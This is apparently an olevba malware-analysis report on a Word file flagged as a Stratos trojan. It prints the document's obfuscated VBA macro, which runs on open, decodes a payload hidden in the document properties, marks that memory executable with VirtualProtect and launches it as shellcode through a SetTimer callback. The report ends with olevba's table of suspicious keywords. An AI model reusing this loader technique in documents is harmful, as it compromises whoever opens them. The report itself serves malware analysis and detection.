olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Stratos.gen-a98e75141a6a6fabb6c14209f4830ee44f30f048e92026386c0def476509dcb8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Stratos.gen-a98e75141a6a6fabb6c14209f4830ee44f30f048e92026386c0def476509dcb8 - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 Then
Private Declare PtrSafe Function CorvusCockswain Lib "user32" Alias "SetTimer" (ByVal SemifictionBiospeleologyNihilists As LongPtr, ByVal LovelassUnshiftingEngoument As LongPtr, ByVal PeakyishCorbeillesSaponaria As LongPtr, ByVal PrecardiacFluoroticTrypanolysin As LongPtr) As LongPtr
Private Declare PtrSafe Function LeachesMandatum Lib "user32" Alias "KillTimer" (ByVal HederigerentSclereid As LongPtr, ByVal ArchprototypeLithofellic As LongPtr) As LongPtr
Private Declare PtrSafe Function DisappointVulcanizerMendaite Lib "kernel32" Alias "VirtualProtect" (ByVal SchellingismSphericalnessScuddy As LongPtr, ByVal HerigautAmaut As LongPtr, ByVal TommyrotSuperbnessSouthing As LongPtr, LancasterUnprobably As LongPtr) As LongPtr
#Else
Private Declare Function CorvusCockswain Lib "user32" Alias "SetTimer" ( ByVal RespirometerOctometerGlomerulose As Long, ByVal CounterirritationStoicheiometry As Long, ByVal VrouwNonmeteorologicallyMidline As Long, ByVal CoronetRachitogenic As Any) As Long
Private Declare Function LeachesMandatum Lib "user32" Alias "KillTimer" ( ByVal NongeometricalApoatropine As Long, ByVal SocioculturalClinkstoneMicrofibrillar As Long) As Long
Private Declare Function DisappointVulcanizerMendaite Lib "kernel32" Alias "VirtualProtect"  (ByVal CorticoafferentDehydrated As Long, ByVal UnpaperThroatlet As Long, ByVal PicturabilityTraikedSuggil As Long, NototribeSewans As Long) As Long
#End If
Private Sub Document_Open()
ErinizeNonnihilismHavercake
End Sub
Private Sub ErinizeNonnihilismHavercake()
Dim AcetylcholineKeyageDemitranslucence() As Byte
#If Win64 Then
AcetylcholineKeyageDemitranslucence = NonconceptionReprehensively(ActiveDocument.BuiltInDocumentProperties(QHtlvRVCG("QEsxPTpXr_")).Value)
#Else
AcetylcholineKeyageDemitranslucence = NonconceptionReprehensively(ActiveDocument.BuiltInDocumentProperties(QHtlvRVCG("XhBSfoyK")).Value)
#End If
#If VBA7 Then
Dim UncommandednessBurree As LongPtr
Dim HemocyaninBradyseismical As LongPtr
Dim shellCode As LongPtr
Dim PhototonusCodheadedArteriographic As LongPtr
#Else
Dim UncommandednessBurree As Long
Dim HemocyaninBradyseismical As Long
Dim shellCode As Long
Dim PhototonusCodheadedArteriographic As Long
#End If
HemocyaninBradyseismical = UBound(AcetylcholineKeyageDemitranslucence) + 1
shellCode = VarPtr(AcetylcholineKeyageDemitranslucence(0))
DisappointVulcanizerMendaite shellCode, HemocyaninBradyseismical, 64, VarPtr(UncommandednessBurree)
GetObject(QHtlvRVCG("RCdJ0qlYFVM8N")).Environment(QHtlvRVCG("osjICjfuZ44U"))(QHtlvRVCG("EwS_e_p")) = QHtlvRVCG("sYyCZ5F1n")
PhototonusCodheadedArteriographic = CorvusCockswain(0, shellCode, 1, shellCode)
StuntBoxfuls 1
LeachesMandatum 0, PhototonusCodheadedArteriographic
GetObject(QHtlvRVCG("gu7iPgUC")).Environment(QHtlvRVCG("bm9f6a")).Remove (QHtlvRVCG("QKdYlvGnn7m"))
ReDim AcetylcholineKeyageDemitranslucence(1)
End Sub
Public Function QHtlvRVCG(strInput)
QHtlvRVCG = StrReverse(ActiveDocument.CustomDocumentProperties(strInput))
End Function
Sub StuntBoxfuls(Finish)
Dim ConfiscatableSagesse As Long
Dim UniatismSpavindy As Long
UniatismSpavindy = Timer() + (Finish)
Do
ConfiscatableSagesse = Timer()
DoEvents
Loop Until ConfiscatableSagesse > UniatismSpavindy
End Sub
Function IndictmentsPreguessExplicableness(ChristcrossUnbenignant, NausetSleddedGirsle)
IndictmentsPreguessExplicableness = Mid(ChristcrossUnbenignant, NausetSleddedGirsle + 1, 1)
End Function
Function ExemplifyingElasticness(PiecenerTruncageBighorn) As Long
If Int(Rnd(23)) > 2 Then
ExemplifyingElasticness = 9000
Else
ExemplifyingElasticness = Len(PiecenerTruncageBighorn)
End If
End Function
Function NonconceptionReprehensively(EsmeraldanBaffler)
ReDim SubstratOrpheum(ExemplifyingElasticness(EsmeraldanBaffler) - 1) As Byte
Dim HoarheadAspidateDisarrangement As Long, GrindeliaMovies As Long
Dim UndraperiedBlackbirdsOopak: UndraperiedBlackbirdsOopak = QHtlvRVCG("uIVkWwsm") & QHtlvRVCG("kgA1X7")
For HoarheadAspidateDisarrangement = 0 To ExemplifyingElasticness(EsmeraldanBaffler) - 1 Step 2
GrindeliaMovies = HoarheadAspidateDisarrangement / 2
SubstratOrpheum(GrindeliaMovies) = CDec(UndraperiedBlackbirdsOopak & IndictmentsPreguessExplicableness(EsmeraldanBaffler, HoarheadAspidateDisarrangement) & IndictmentsPreguessExplicableness(EsmeraldanBaffler, HoarheadAspidateDisarrangement + 1))
Next
NonconceptionReprehensively = SubstratOrpheum
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VirtualProtect      |May inject code into another process         |
|Suspicious|SetTimer            |May run a shellcode in memory                |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

